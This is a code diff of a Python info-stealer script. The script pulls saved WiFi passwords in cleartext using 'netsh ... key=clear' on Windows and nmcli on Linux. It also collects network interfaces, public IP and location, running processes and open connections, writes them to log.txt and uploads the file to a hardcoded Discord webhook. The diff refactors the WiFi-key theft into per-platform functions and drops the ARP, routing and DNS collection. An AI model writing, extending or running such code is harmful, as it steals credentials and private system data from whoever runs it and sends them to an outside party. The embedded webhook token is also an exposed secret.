@@ -5,7 +5,6 @@ import platform
 import socket
 import os
 import netifaces
-import re
 
 # Discord Webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'
@@ -55,40 +54,54 @@ def get_network_interfaces():
     
     return network_info
 
-# Function to get saved WiFi profiles
-def get_saved_wifi_profiles():
+# Function to get saved WiFi profiles for Windows
+def get_saved_wifi_profiles_windows():
     wifi_profiles = []
-    if platform.system() == 'Windows':
-        # Windows - using netsh command
-        profiles = execute_command('netsh wlan show profiles')
-        profiles = profiles.split('\n')
-        profiles = [profile.split(':')[1].strip() for profile in profiles if 'Profil für' in profile]
+    profiles = execute_command('netsh wlan show profiles')
+    profiles = profiles.split('\n')
+    profiles = [profile.split(':')[1].strip() for profile in profiles if 'Profil für' in profile]
 
-        for profile in profiles:
-            profile_info = {}
-            profile_info['SSID'] = profile
-            profile_details = execute_command(f'netsh wlan show profile name="{profile}" key=clear')
-            if 'Sicherheitsschlüssel' in profile_details:
-                security_key = profile_details.split('Sicherheitsschlüssel')[-1].strip().split('\n')[0].split(':')[1].strip()
-                profile_info['Security Key'] = security_key
-            wifi_profiles.append(profile_info)
-
-    elif platform.system() == 'Linux':
-        # Linux - using nmcli command (NetworkManager CLI)
-        profiles = execute_command('nmcli connection show --active')
-        profiles = profiles.split('\n')
-        profiles = [profile.split()[0] for profile in profiles if 'WLAN' in profile]
-
-        for profile in profiles:
-            profile_info = {}
-            profile_info['SSID'] = profile
-            profile_details = execute_command(f'nmcli connection show {profile}')
-            if '802-11-wireless-security.psk' in profile_details:
-                security_key = profile_details.split('802-11-wireless-security.psk:')[1].strip().split('\n')[0].strip()
-                profile_info['Security Key'] = security_key
-            wifi_profiles.append(profile_info)
+    for profile in profiles:
+        profile_info = {}
+        profile_info['SSID'] = profile
+        profile_details = execute_command(f'netsh wlan show profile name="{profile}" key=clear')
+        if 'Sicherheitsschlüssel' in profile_details:
+            security_key = profile_details.split('Sicherheitsschlüssel')[-1].strip().split('\n')[0].split(':')[1].strip()
+            profile_info['Security Key'] = security_key
+        # Get IP addresses for each profile (currently set to None)
+        profile_info['IP Address'] = None  # Replace with actual logic to fetch IP addresses
+        wifi_profiles.append(profile_info)
 
     return wifi_profiles
+
+# Function to get saved WiFi profiles for Linux (NetworkManager)
+def get_saved_wifi_profiles_linux():
+    wifi_profiles = []
+    profiles = execute_command('nmcli connection show --active')
+    profiles = profiles.split('\n')
+    profiles = [profile.split()[0] for profile in profiles if 'WLAN' in profile]
+
+    for profile in profiles:
+        profile_info = {}
+        profile_info['SSID'] = profile
+        profile_details = execute_command(f'nmcli connection show {profile}')
+        if '802-11-wireless-security.psk' in profile_details:
+            security_key = profile_details.split('802-11-wireless-security.psk:')[1].strip().split('\n')[0].strip()
+            profile_info['Security Key'] = security_key
+        # Get IP addresses for each profile (currently set to None)
+        profile_info['IP Address'] = None  # Replace with actual logic to fetch IP addresses
+        wifi_profiles.append(profile_info)
+
+    return wifi_profiles
+
+# Function to collect all saved WiFi profiles based on platform
+def get_saved_wifi_profiles():
+    if platform.system() == 'Windows':
+        return get_saved_wifi_profiles_windows()
+    elif platform.system() == 'Linux':
+        return get_saved_wifi_profiles_linux()
+    else:
+        return []
 
 # Function to get public IP address
 def get_public_ip():
@@ -145,21 +158,6 @@ def get_network_connections():
     connections = execute_command('netstat -tuln')
     return connections
 
-# Function to get ARP table
-def get_arp_table():
-    arp_table = execute_command('arp -a')
-    return arp_table
-
-# Function to get routing table
-def get_routing_table():
-    routing_table = execute_command('ip route')
-    return routing_table
-
-# Function to get DNS server information
-def get_dns_servers():
-    dns_servers = execute_command('cat /etc/resolv.conf | grep nameserver')
-    return dns_servers
-
 # Collect detailed network, WiFi, and device information
 network_interfaces = get_network_interfaces()
 saved_wifi_profiles = get_saved_wifi_profiles()
@@ -172,9 +170,6 @@ memory_info = get_memory_info()
 cpu_info = get_cpu_info()
 running_processes = get_running_processes()
 network_connections = get_network_connections()
-arp_table = get_arp_table()
-routing_table = get_routing_table()
-dns_servers = get_dns_servers()
 
 # Write collected information to log.txt
 log_file_path = 'log.txt'
@@ -202,6 +197,8 @@ with open(log_file_path, 'w') as f:
         f.write(f"SSID: {profile['SSID']}\n")
         if 'Security Key' in profile:
             f.write(f"Security Key: {profile['Security Key']}\n")
+        if 'IP Address' in profile:
+            f.write(f"IP Address: {profile['IP Address']}\n")
         f.write("\n")
 
     f.write("=== Public IP and Location ===\n")
@@ -228,12 +225,6 @@ with open(log_file_path, 'w') as f:
 
     f.write("=== Network Connections ===\n")
     f.write(f"{network_connections}\n")
-
-    f.write("=== ARP Table ===\n")
-    f.write(f"{arp_table}\n")
-
-    f.write("=== Routing Table ===\n")
-    f.write(f"{routing_table}\n")
 
 # Send log.txt content to Discord webhook
 send_to_discord(log_file_path)
